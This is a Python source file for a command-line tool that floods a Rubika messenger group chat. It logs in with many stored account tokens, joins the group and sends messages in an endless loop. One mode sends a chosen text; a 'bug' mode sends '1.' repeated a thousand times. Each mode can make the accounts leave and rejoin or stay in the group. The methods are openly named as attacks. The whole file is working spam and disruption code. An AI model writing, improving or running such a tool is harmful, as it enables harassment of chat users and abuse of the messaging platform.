import os
import pyrubi
import time
import auths
import keys

class colors:
    ''' Main Colors '''
    red = '\033[91m'
    green = '\033[92m'
    blue = '\033[94m'
    yellow = '\033[93m'
    magenta = '\033[95m'
    cyan = '\033[96m'
    white = '\033[97m'
    bold = '\033[1m'
    underline = '\033[4m'
    black='\033[30m'
    Backsilver='\033[100m'
    silver='\033[90m'
    Backwhite='\033[3m'
    Backgreen='\033[42m'
    Backyellow='\033[43m'
    BackBlue='\033[44m'
    Backpink='\033[45m'
    Backcyan='\033[46m'
    BackRed='\033[41m'
    green = '\033[32m' 
    red = '\033[31m' 
    blue = '\033[36m' 
    pink = '\033[35m' 
    yellow = '\033[93m' 
    darkblue = '\033[34m' 
    white = '\033[00m'
    bluo = '\033[34m'
    red_p = '\033[41m'
    green_p = '\033[42m'
    bluo_p = '\033[44m'
    pink_p = '\033[45m'
    blue_p = '\033[46m'
    white_p = '\033[47m'
    rd = '\033[91m'
    black='\033[30m'
    bold = '\033[1m'
    underline = '\033[4m'
    magenta = '\033[95m'
    
    ''' Colors '''
    MAIN = '\001\033[38;5;85m\002'
    GREEN = '\001\033[38;5;82m\002'
    GRAY = PLOAD = '\001\033[38;5;246m\002'
    NAME = '\001\033[38;5;228m\002'
    RED = '\001\033[1;31m\002'
    FAIL = '\001\033[1;91m\002'
    ORANGE = '\001\033[0;38;5;214m\002'
    LRED = '\001\033[0;38;5;196m\002'
    BOLD = '\001\033[1m\002'
    PURPLE = '\001\033[0;38;5;141m\002'
    BLUE = '\001\033[0;38;5;12m\002'
    UNDERLINE = '\001\033[4m\002'
    UNSTABLE = '\001\033[5m\002'
    END = '\001\033[0m\002'


    ''' MSG Prefixes '''
    INFO = f'{MAIN}Info{END}'
    WARN = f'{ORANGE}Warning{END}'
    IMPORTANT = f'{ORANGE}Important{END}'
    FAILED = f'{RED}Fail{END}'
    ERR = f'{LRED}Error{END}'
    DEBUG = f'{ORANGE}Debug{END}'
    CHAT =f'{BLUE}Chat{END}'
    GRN_BUL = f'[{GREEN}*{END}]'
    META_INFO = '\001\033[38;5;93m\002I\001\033[38;5;129m\002N\001\033[38;5;165m\002F\001\033[38;5;201m\002O\001\033[0m\002'
    
    @staticmethod
    def infoMessage(time_, msg):
        return f"{colors.white}[{colors.cyan}{time_}{colors.white}] [{colors.META_INFO}]{colors.yellow} {msg}"
    
    @staticmethod
    def errorMessage(time_, msg):
        return f"{colors.white}[{colors.cyan}{time_}{colors.white}] [{colors.BackRed}ERROR{colors.white}]{colors.GRAY} {msg}"
    
    def printBanner():
        a = "{"
        b = "}"
        return f"""{colors.red}
    ____                               
    /    )          /     ,            
---/___ /----------/__--------__----__-
  /    |   /   /  /   ) /   /   ) /   )
_/_____|__(___(__(___/_/___(___/_(___(_
                              /        
                          (_ /  
                          
            {colors.yellow}{a}{colors.white}host1let#dev{colors.yellow}{b}
"""

class Usage:
    
    def splitUserLenghtHelp():
        return """usage: rust link=#<Link of Gap> guid=#<guid of Gap>
for attack with text and leave => rust link=#<Link of Gap> guid=#<guid of Gap> text=#<text to send>
for attack with text and not leave => rust link=#<Link of Gap> guid=#<guid of Gap> text=#<text to send> -nl

for attack bug with leave => rust link=#<Link of Gap> guid=#<guid of Gap> text=bug
for attack bug with not leave => rust link=#<Link of Gap> guid=#<guid of Gap> text=bug -nl"""

class C:
    
    numToSend = 0
    
    def __init__(self, auth = None, key= None, link= None, guid= None, text = None) -> None:
        self.auth = auth
        self.key = key
        self.link = link
        self.guid = guid
        self.text = text
        self.path = os.getcwd()
        
    def attack_on_gap_use_leave(self):
        cli = pyrubi.Client(auth=self.auth, private=self.key, platform="android")
        cli.join_chat(self.link)
        timeToJoin = time.strftime('%H:%M:%S')
        print(colors.infoMessage(timeToJoin, 'Bot Join the Gap'))
        
        while 1:
            try:
                cli.send_text(self.guid, self.text)
                timeToSend = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToSend, 'text send in gap'))
                cli.leave_chat(self.guid)
                timeToLeave = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToLeave, 'Bot Leave the gap'))
                C.numToSend += 1
                print(colors.infoMessage(timeToLeave, C.numToSend))
                print()
            
            except KeyboardInterrupt:
                print('bye')
                exit()
            
            finally:
                C.numToSend = 0
                
    def attack_on_gap_not_leave(self):
        cli = pyrubi.Client(auth=self.auth, private=self.key, platform="android")
        cli.join_chat(self.link)
        timeToJoin = time.strftime('%H:%M:%S')
        print(colors.infoMessage(timeToJoin, 'Bot Join the Gap'))
        
        while 1:
            try:
                cli.send_text(self.guid, self.text)
                timeToSend = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToSend, 'text send in gap'))
                C.numToSend += 1
                print(colors.infoMessage(timeToSend, C.numToSend))
                print()
            
            except KeyboardInterrupt:
                print('bye')
                exit()
            
            finally:
                C.numToSend = 0
                
    def sendBug_and_leave(self):
        cli = pyrubi.Client(auth=self.auth, private=self.key, platform="android")
        cli.join_chat(self.link)
        timeToJoin = time.strftime('%H:%M:%S')
        print(colors.infoMessage(timeToJoin, 'Bot Join the Gap'))
        
        while 1:
            try:
                cli.send_text(self.guid, "1."*1000)
                timeToSend = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToSend, 'Bug send in gap'))
                cli.leave_chat(self.guid)
                timeToLeave = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToLeave, 'Bot Leave the gap'))
                C.numToSend += 1
                print(colors.infoMessage(timeToLeave, C.numToSend))
            
            except KeyboardInterrupt:
                print('bye')
                exit()
            
            finally:
                C.numToSend = 0
    
    def sendBug_and_not_leave(self):
        cli = pyrubi.Client(auth=self.auth, private=self.key, platform="android")
        cli.join_chat(self.link)
        timeToJoin = time.strftime('%H:%M:%S')
        print(colors.infoMessage(timeToJoin, 'Bot Join the Gap'))
        
        while 1:
            try:
                cli.send_text(self.guid, "1."*1000)
                timeToSend = time.strftime('%H:%M:%S')
                print(colors.infoMessage(timeToSend, 'Bug send in gap'))
                C.numToSend += 1
                print(colors.infoMessage(timeToSend, C.numToSend))
            
            except KeyboardInterrupt:
                print('bye')
                exit()
            
            finally:
                C.numToSend = 0
                
            
    
    def Activity(self):
        print(colors.printBanner())
        
        authFile = auths.Auths
        keyFile = keys.Keys
        
        while 1:
            user = str(input(f'\n{colors.white}{colors.underline}Rubiga{colors.white} > '))
            splitUser = user.split()
            
            if "rust" in splitUser:
                if len(splitUser) == 1:
                    timeLenOfRust = time.strftime('%H:%M:%S')
                    print(colors.infoMessage(time_=timeLenOfRust, msg=Usage.splitUserLenghtHelp()))
                
                else:
                    # Use the main Function for attack
                    # attack with leave and text
                    link_ = splitUser[splitUser.index('rust')+1].split('=')[-1]
                    guid_ = splitUser[splitUser.index('rust')+2].split('=')[-1]
                    text_ = splitUser[splitUser.index('rust')+3].split('=')[-1]
                    
                    # if request for send bug
                    if text_ == "bug":
                        if splitUser[-1] == '-nl':
                            for au1 in authFile:
                                for ke1 in keyFile:
                                    C(au1, ke1, link_, guid_).sendBug_and_not_leave()
                        else:
                            for au1 in authFile:
                                for ke1 in keyFile:
                                    C(au1, ke1, link_, guid_).sendBug_and_leave()
                    
                    else:
                        if splitUser[-1] == '-nl':
                            for au1 in authFile:
                                for ke1 in keyFile:
                                    C(au1, ke1, link_, guid_, text_).attack_on_gap_not_leave()
                        else:
                            for au1 in authFile:
                                for ke1 in keyFile:
                                    C(au1, ke1, link_, guid_, text_).attack_on_gap_use_leave()


if __name__ == "__main__":
    c = C()
    c.Activity()
